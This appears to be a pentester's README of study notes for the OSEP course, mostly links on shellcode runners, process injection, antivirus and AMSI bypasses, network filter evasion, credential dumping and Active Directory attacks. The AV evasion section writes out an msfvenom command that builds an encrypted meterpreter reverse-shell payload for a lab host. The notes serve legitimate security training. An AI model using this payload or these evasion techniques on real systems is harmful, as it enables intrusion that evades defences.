# Experienced-Pentester-OSEP

Just a place to store some of my pre-course research notes.

## Operating System and Programming Theory

### Win32 API's
https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d

https://rastamouse.me/blog/process-injection-dinvoke/

https://www.pinvoke.net/

### Windows Registry
https://en.wikipedia.org/wiki/Windows_Registry

https://www.lifewire.com/windows-registry-2625992

## Client Side Code Execution With Office

### Staged vs Non-Staged Payloads
https://buffered.io/posts/staged-vs-stageless-handlers/

### Droppers / Stagers
https://en.wikipedia.org/wiki/Dropper_(malware)

https://rastamouse.me/blog/asb-bypass-pt2/

### HTML Smuggling (Not HTTP Request Smuggling)
https://outflank.nl/blog/2018/08/14/html-smuggling-explained/

https://github.com/Arno0x/EmbedInHTML

### Phishing with Microsoft Office
https://digitalguardian.com/blog/what-macro-malware

https://support.microsoft.com/en-us/office/automatically-run-a-macro-when-opening-a-workbook-1e55959b-e077-4c88-a696-c3017600db44

https://stackoverflow.com/questions/51296291/auto-open-sub-vba/51296480

https://www.exceltip.com/events-in-vba/how-to-run-a-macro-automatically-when-workbook-opens-in-excel.html

https://github.com/Arno0x/EmbedInHTML

### Phishing Pretexts
https://github.com/L4bF0x/PhishingPretexts

### Calling Win32 APIs from VBA
https://www.aeternus.sg/how-to-use-windows-api-in-vba/

https://renenyffenegger.ch/notes/development/languages/VBA/Win-API/index

https://docs.microsoft.com/en-us/dotnet/visual-basic/programming-guide/com-interop/walkthrough-calling-windows-apis

### VBA Shellcode Runners
https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/

https://www.bitdam.com/2018/05/22/propertybomb-an-old-new-technique-for-arbitrary-code-execution-in-vba-macro/

https://github.com/infosecn1nja/MaliciousMacroMSBuild

### PowerShell Shellcode Runner
https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1/

https://www.raydbg.com/2017/Call-Native-Win32-API-in-PowerShell/

https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1

https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/

https://stackoverflow.com/questions/63593930/how-to-call-a-win32-api-function-from-powershell

https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf

### PowerShell in Memory
https://isc.sans.edu/forums/diary/Fileless+Malicious+PowerShell+Sample/23081/

https://github.com/PowerShell/PowerShell/blob/master/src/Microsoft.PowerShell.CoreCLR.Eventing/DotNetCode/Eventing/UnsafeNativeMethods.cs

### DelegateType Reflection
https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/how-to-hook-up-a-delegate-using-reflection

https://www.powershellgallery.com/packages/poke/1.0.0.2/Content/delegate.ps1

### Proxy-Aware PowerShell Communications
http://woshub.com/using-powershell-behind-a-proxy/

https://stackoverflow.com/questions/14263359/access-web-using-powershell-and-proxy

https://cloudrun.co.uk/powershell/configuring-powershell-to-work-behind-a-proxy-server/

https://medium.com/river-yang/powershell-working-behind-a-proxy-with-authentication-eb68a337f222

## Client Side Code Execution With Windows Script Host

### JScript Execution
https://docs.microsoft.com/en-us/previous-versions/windows/desktop/indexsrv/running-a-jscript-query

### JScript Basic Dropper
https://github.com/hlldz/SpookFlare

### HTA, VBA, JScript, CScript Payload Creation and Obfuscation
https://github.com/tyranid/DotNetToJScript

https://github.com/med0x2e/GadgetToJScript

### SharpShooter
https://github.com/mdsecactivebreach/SharpShooter

## Process Injection and Migration

### Process Injection
https://github.com/3xpl01tc0d3r/ProcessInjection

https://github.com/secrary/InjectProc

https://rastamouse.me/blog/process-injection-dinvoke/

https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing

### DLL Injection
https://en.wikipedia.org/wiki/DLL_injection#:~:text=In%20computer%20programming%2C%20DLL%20injection,did%20not%20anticipate%20or%20intend.

https://medium.com/bug-bounty-hunting/dll-injection-attacks-in-a-nutshell-71bc84ac59bd

https://youtu.be/yKoD5Oy8CKQ

http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html

https://github.com/fdiskyou/injectAllTheThings

### Reflective DLL Injection
https://github.com/stephenfewer/ReflectiveDLLInjection

#### Reflect DLL Injection via PowerShell
https://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

### Process Hollowing
https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75

https://github.com/caesartcs/ProcessHollowing

https://github.com/m0n0ph1/Process-Hollowing

## Intro to AV Evasion

### Bypassing Antivirus with Metasploit

#### Metasploit Encryptors
https://blog.rapid7.com/2019/11/21/metasploit-shellcode-grows-up-encrypted-and-authenticated-c-shells/

#### AES Encrypted MSFVenom Payload
```
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.112 LPORT=9999 -f csharp --encrypt aes256 --encrypt-key 12345678901234567890123456789012 --encrypt-iv 1234567890123456
```

(Encryption Key must be 32 bytes)
(Encryption IV must be 16 bytes)

#### Other MSFVenom Encryptor Options

```
$ msfvenom --list encrypt

Framework Encryption Formats [--encrypt <value>]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor

```

#### .NET/C# AES Payload Encryption
https://sevrosecurity.com/2019/05/25/bypass-windows-defender-with-a-simple-shell-loader/

https://github.com/cribdragg3r/Simple-Loader

## Advanced Antivirus Evasion

### Antimalware Scanning Interface (AMSI)
https://rastamouse.me/blog/asb-bypass-pt2/

https://rastamouse.me/blog/asb-bypass-pt3/

https://rastamouse.me/blog/asb-bypass-pt4/

## Application Whitelisting

### Theory
https://searchsecurity.techtarget.com/definition/application-whitelisting#:~:text=Application%20whitelisting%20is%20the%20practice,networks%20from%20potentially%20harmful%20applications.

### Bypasses
https://github.com/api0cradle/UltimateAppLockerByPassList

https://github.com/0xVIC/myAPPLockerBypassSummary

## Bypassing Network Filters

### Domain Fronting
https://digi.ninja/blog/domain_fronting.php

https://attack.mitre.org/techniques/T1090/004/

https://medium.com/@malcomvetter/simplifying-domain-fronting-8d23dcb694a0

### DNS Tunneling
https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling

https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/

## Linux Post-Exploitation

### Antiscan.me
https://antiscan.me/

### Shared DLL Hijacking
https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library

https://www.boiteaklou.fr/Abusing-Shared-Libraries.html

https://sumit-ghosh.com/articles/hijacking-library-functions-code-injection-ld-preload/

## Kiosk Breakouts / Attacks
https://www.trustedsec.com/blog/kioskpos-breakout-keys-in-windows/

https://sra.io/blog/sitekiosk-breakout/

https://www.engetsu-consulting.com/blog/kiosk-breakout-windows

## Windows Credentials

### Local Windows Credentials

#### SAM Dump
https://medium.com/@sanjumalhotra26/dumping-credentials-from-sam-file-using-mimikatz-and-cracking-with-john-the-ripper-and-hashcat-ce5bbf2f4f5a

#### Hardening the Local Admin Account (LAPS)
https://rastamouse.me/blog/laps-pt1/

https://rastamouse.me/blog/laps-pt2/

https://github.com/kfosaaen/Get-LAPSPasswords

https://blog.netspi.com/running-laps-around-cleartext-passwords/

## Microsoft SQL Attacks

### MS SQL Enumeration
https://www.mssqltips.com/sqlservertip/2013/find-sql-server-instances-across-your-network-using-windows-powershell/

https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/

https://www.mssqltips.com/sqlservertip/4181/inventory-sql-logins-on-a-sql-server-with-powershell/

### UNC Path Injection
https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e

https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/

https://hackingandsecurity.blogspot.com/2017/07/10-places-to-stick-your-unc-path.html

https://secure360.org/wp-content/uploads/2017/05/SQL-Server-Hacking-on-Scale-UsingPowerShell_S.Sutherland.pdf

## Active Directory Exploitation

### BloodHound
https://github.com/BloodHoundAD/BloodHound

#### Ingestors
https://github.com/BloodHoundAD/SharpHound

https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/AzureHound.ps1

https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1

https://github.com/fox-it/BloodHound.py

### Abusing Object Security Permissions
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces

### Kerberos Delegation

#### Unconstrained Delegation
https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1

https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/

https://www.qomplx.com/qomplx-knowledge-kerberos-delegation-attacks-explained/

#### Constrained Delegation
https://www.guidepointsecurity.com/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/

https://stealthbits.com/blog/constrained-delegation-abuse-abusing-constrained-delegation-to-achieve-elevated-access/

#### Resource-Based Constrained Delegation
https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution

### Active Directoy Inter-Forest Exploitation
http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/

https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/

https://adsecurity.org/?p=1588

https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
